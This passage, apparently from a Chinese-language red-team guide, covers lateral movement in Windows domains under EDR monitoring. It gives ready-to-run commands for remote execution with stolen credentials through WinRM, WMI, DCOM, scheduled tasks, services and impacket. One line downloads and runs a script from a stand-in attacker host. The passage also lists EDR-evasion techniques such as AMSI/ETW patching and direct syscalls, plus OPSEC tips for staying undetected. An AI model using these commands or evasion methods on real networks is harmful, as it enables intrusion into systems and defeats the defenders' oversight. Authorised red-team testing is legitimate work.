## 七、EDR 环境下的高级横向移动

### 7.1 EDR 检测机制认知（对抗前提）

```
现代 EDR：行为分析 + 内核遥测（ETW）+ 用户态 hook + AI 模型，不止签名
关键被监测点：进程创建(4688/AMSI)、LSASS 访问、内存注入、PowerShell 脚本块、
  WMI/计划任务远程执行、新服务、网络外联特征、命令行参数特征
```
> 数据点：CrowdStrike 2024 年 79% 检出是 malware-free（合法凭据 + LOTL + RMM 工具），Bitdefender 分析 84% 高危攻击使用 Living off the Land——**EDR 环境下"无文件/无恶意软件横向"是主流**。

### 7.2 LOTL 无文件横向（不落盘、不加载恶意二进制）

```bash
# 1. PowerShell Remoting（WinRM，域内默认开启）
$cred = New-Object PSCredential('user',(ConvertTo-SecureString 'pass' -AsPlainText -Force))
Invoke-Command -ComputerName 10.0.0.5 -Credential $cred -ScriptBlock { whoami; ipconfig }
# 内存加载执行（无文件）：IEX (New-Object Net.WebClient).DownloadString('http://attacker/p.ps1')

# 2. WMI（远程执行，无文件）
wmic /node:10.0.0.5 /user:corp.local\user /password:pass process call create "cmd /c calc"

# 3. DCOM（利用 MMC 等 COM 对象）
impacket-dcomexec corp.local/user:pass@10.0.0.5

# 4. 计划任务远程注册
schtasks /create /s 10.0.0.5 /u corp.local\user /p pass /tn back /tr "cmd /c whoami" /sc once /st 00:00
schtasks /run /s 10.0.0.5 /tn back

# 5. 服务远程创建（sc.exe，LOTL）
sc \\10.0.0.5 create back binPath= "cmd /c whoami" 
sc \\10.0.0.5 start back

# 6. SMB 执行（PsExec 协议、impacket-smbexec）
impacket-smbexec corp.local/user:pass@10.0.0.5
```

### 7.3 免杀与内存执行（横向载荷落地时）

```
- Reflective DLL Loading：内存自加载 DLL，绕过 LoadLibrary hook
- APC 注入 / Thread Hijacking：注入合法进程（svchost/explorer）
- 直接系统调用（Direct Syscalls）：绕过用户态 EDR hook
- Sleep 混淆 + PE Header Stomping：规避内存扫描
- 白名单进程链（LOLBIN）：mshta/rundll32/certutil/msiexec/regsvr32 加载
- AMSI/ETW patch：解除 PowerShell 监控（注意版本差异与 EDR 反制）
- 混淆：XOR/AES 载荷 + 运行时解密；字符串拆分防命令行检测
```
> 免杀细节（DLL 注入、syscall、sleep 混淆具体命令）见 `intranet-penetration-testing` 技能"免杀与 C2"章节。

### 7.4 横向移动的 OPSEC 与检测对抗
- **时间差**：横向动作放在业务时段，与批量任务天然混合
- **凭证轮换**：一次横向后更换所用凭据（防中途被截获后反制）
- **双跳隐藏**：A→B→C 双跳执行，避免 B 上出现 C 的直接来源特征
- **最小命令**：远程命令尽量精简（whoami/ipconfig 级），避免在目标上运行重型扫描器
- **利用合法工具**：RMM（AnyDesk/TeamViewer/资产管理系统）被滥用在真实攻击中比例极高——红队可模拟该 TTP 测试检测

